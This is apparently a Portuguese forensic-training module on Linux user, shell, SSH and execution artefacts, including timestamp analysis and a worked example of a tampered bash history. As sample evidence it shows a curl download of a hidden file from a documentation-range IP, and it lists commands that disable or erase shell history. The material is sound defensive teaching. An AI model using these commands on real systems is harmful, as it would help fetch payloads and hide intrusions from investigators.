# Artefatos de Usuário, Shell e Execução no Linux

> **Objetivo pedagógico:** interpretar históricos de shell, arquivos de configuração e chaves SSH, artefatos de desktop, de navegadores e de execução (auditd e process accounting), distinguindo o que eles provam do que apenas sugerem.

## 1. Históricos de shell e de ferramentas

| Arquivo | Conteúdo | Observações |
|---|---|---|
| `~/.bash_history` | Comandos do Bash | Gravado ao encerrar a sessão; sem horário, salvo se `HISTTIMEFORMAT` estiver definida |
| `~/.zsh_history` | Comandos do Zsh | Com `EXTENDED_HISTORY`, usa o formato `: epoch:duração;comando` |
| `~/.python_history`, `~/.mysql_history`, `~/.psql_history`, `~/.sqlite_history`, `~/.node_repl_history` | Comandos de ferramentas interativas | Podem conter credenciais e consultas |
| `~/.lesshst` e `~/.viminfo` | Buscas e arquivos editados | `.viminfo` mostra arquivos abertos, registros e buscas |
| `~/.bash_logout`, `~/.bashrc`, `~/.profile`, `~/.bash_profile`, `~/.zshrc` | Configuração do shell | Local de persistência por alias e comandos |

### 1.1 Horários no `.bash_history`

Quando `HISTTIMEFORMAT` está definida, o Bash grava uma linha `#<época Unix>` antes de cada comando:

```
#1761657730
curl -o /tmp/.x http://198.51.100.9/x
```

```bash
# Converter o horário
date -u -d @1761657730
```

### 1.2 Limitações do histórico

| Situação | Efeito |
|---|---|
| Sessão encerrada de forma abrupta (kill ou queda) | O histórico da sessão pode não ser gravado |
| `unset HISTFILE`, `export HISTFILE=/dev/null`, `export HISTSIZE=0` ou `history -c` | Evita ou apaga o histórico |
| Comandos de sessões não interativas (por exemplo, `ssh host comando`, scripts, web shells) | Em geral não são registrados |
| Início de comando com espaço (`HISTCONTROL=ignorespace`) | Não é registrado |
| Histórico truncado por tamanho (`HISTFILESIZE`) | Perda dos comandos mais antigos |
| Usuário diferente | Cada usuário possui o seu próprio arquivo |

A ausência de comandos não prova que não foram executados; corrobore com auditd, memória e logs.

## 2. SSH

| Arquivo | Conteúdo | Valor forense |
|---|---|---|
| `~/.ssh/authorized_keys` | Chaves públicas autorizadas a entrar na conta | Persistência: chaves desconhecidas, comentários e opções (`command=`, `from=`) |
| `~/.ssh/known_hosts` | Chaves de hosts acessados a partir da conta | Hosts contatados; os nomes costumam ser armazenados como hash |
| `~/.ssh/config` | Configuração do cliente | Aliases, `ProxyJump`, `IdentityFile` e `ForwardAgent` |
| `~/.ssh/id_*` | Chaves privadas | Roubo de chaves; permissões e carimbos |
| `/etc/ssh/sshd_config` | Configuração do servidor | `PermitRootLogin`, `PasswordAuthentication`, `AuthorizedKeysFile` |
| `~/.ssh/environment` e `rc` | Execução ao logon | Possível persistência |

```bash
# Verificar se um host consta de um known_hosts com nomes em hash
ssh-keygen -F servidor.exemplo.com -f /mnt/analise/home/u/.ssh/known_hosts

# Impressão digital das chaves autorizadas, para ligar com o log do sshd
ssh-keygen -lf /mnt/analise/home/u/.ssh/authorized_keys

# Carimbos dos arquivos de SSH
stat /mnt/analise/home/u/.ssh/authorized_keys
```

Compare a impressão digital de cada chave em `authorized_keys` com a registrada em `Accepted publickey` no log.

## 3. Arquivos de desktop e de aplicativos

| Artefato | Local | Valor |
|---|---|---|
| Arquivos recentes (GTK) | `~/.local/share/recently-used.xbel` | Arquivos abertos em aplicativos gráficos |
| Lixeira do usuário | `~/.local/share/Trash/files` e `info` | Arquivos excluídos e arquivos `.trashinfo` com caminho original e data |
| Miniaturas | `~/.cache/thumbnails/` | Miniaturas de imagens que podem permanecer após a exclusão do original |
| Início automático | `~/.config/autostart/` | Persistência de sessão gráfica |
| Navegadores | `~/.mozilla/firefox/<perfil>/` e `~/.config/google-chrome/` | Histórico, downloads, cookies |
| Cache e configuração | `~/.cache/` e `~/.config/` | Aplicativos usados e dados temporários |
| Clientes de nuvem | `~/.aws/`, `~/.config/gcloud/`, `~/.azure/`, `~/.kube/` | Credenciais e contexto de acesso |

## 4. Execução de programas

| Fonte | Descrição | Limitações |
|---|---|---|
| auditd (`EXECVE`) | Registra comandos executados com argumentos e usuário | Depende das regras e da retenção |
| Process accounting (`acct`) | Registra processos encerrados (`/var/log/account/pacct` ou `/var/account/pacct`); `lastcomm` lista | Precisa estar habilitado |
| Cron, systemd e logs de serviço | Execuções agendadas e de serviços | Somente o que o serviço registra |
| Memória | Processos ativos, linhas de comando e módulos carregados | Volátil |
| Pacotes e carimbos | Instalação e criação de binários (`dpkg.log`, `rpm`, mtime) | Presença, e não execução |
| `/proc/<pid>/` | `cmdline`, `exe`, `environ`, `maps` e `fd` | Somente ao vivo |
| Bibliotecas e `LD_PRELOAD` | Variável de ambiente e `/etc/ld.so.preload` | Persistência e interceptação |

```bash
# Process accounting: comandos por usuário (se habilitado)
lastcomm --user u --file /mnt/analise/var/log/account/pacct | head -50

# Comandos executados capturados pelo auditd
ausearch -m EXECVE -ts this-week -i
```

## 5. Carimbos e atividade em arquivos

| Carimbo | Significado no Linux | Cuidado |
|---|---|---|
| mtime | Modificação do conteúdo | Pode ser alterado com `touch -d` |
| atime | Último acesso | Com `relatime` ou `noatime`, é atualizado só sob condições |
| ctime | Alteração do inode (metadados) | Não é a data de criação; é atualizado por qualquer mudança de metadados e não pode ser definido diretamente pelo usuário |
| crtime (Birth) | Criação, em sistemas suportados | Útil para detectar timestomping (diferença entre `mtime` e `crtime`) |

Indício de manipulação: `mtime` mais antigo do que o `crtime`, ou `ctime` muito mais recente do que o `mtime` em um arquivo supostamente inalterado, após o uso de `touch -d` ou `touch -r`. Compare com a pasta 05.

```bash
stat /mnt/analise/usr/local/bin/helper
# Procurar arquivos alterados em uma janela de tempo (ver também o Plaso e o mactime)
find /mnt/analise -xdev -type f -newermt "2026-10-26" ! -newermt "2026-10-29" -printf '%TY-%Tm-%Td %TH:%TM:%TS %u %p\n' | sort
```

## 6. Exemplo prático: leitura de um histórico adulterado

| Observação | Interpretação |
|---|---|
| `.bash_history` com 12 linhas, todas anteriores a 2026-10-20 | O histórico mais recente pode ter sido apagado ou não gravado |
| `.bash_history` com `ctime` em 2026-10-28T02:30Z | O arquivo foi alterado ou substituído depois da última linha |
| `auth.log` mostra `sudo ... COMMAND=/bin/bash` às 02:15Z | A sessão root existiu |
| auditd registra `EXECVE` de `history -c` e de `rm` em `.bash_history` | Evidência de apagamento |
| Conclusão | Tentativa de ocultar atividade; os comandos foram reconstruídos pelo auditd e por logs; confiança alta |

## 7. Casos de uso corporativos

- Reconstrução dos comandos executados por um administrador em uma mudança contestada.
- Identificação de chaves SSH inesperadas e de acessos persistentes.
- Verificação de credenciais de nuvem deixadas em servidores e em estações Linux.

## 8. Normas e frameworks relevantes

- MITRE ATT&CK: T1059.004 (Unix Shell), T1070.003 (Clear Command History), T1098.004 (SSH Authorized Keys), T1546.004, T1552.001 e T1552.004, T1070.006
- ISO/IEC 27042:2015; NIST SP 800-86
- CIS Benchmarks (configuração segura de SSH e do shell)

## 9. Referências

- Nikkel, B. Practical Linux Forensics. No Starch Press, 2021.
- Polstra, P. Linux Forensics. 2015.
- Documentação do Bash (HISTFILE, HISTTIMEFORMAT), do OpenSSH e do auditd.
- MITRE ATT&CK. https://attack.mitre.org
- SANS Institute. FOR577.
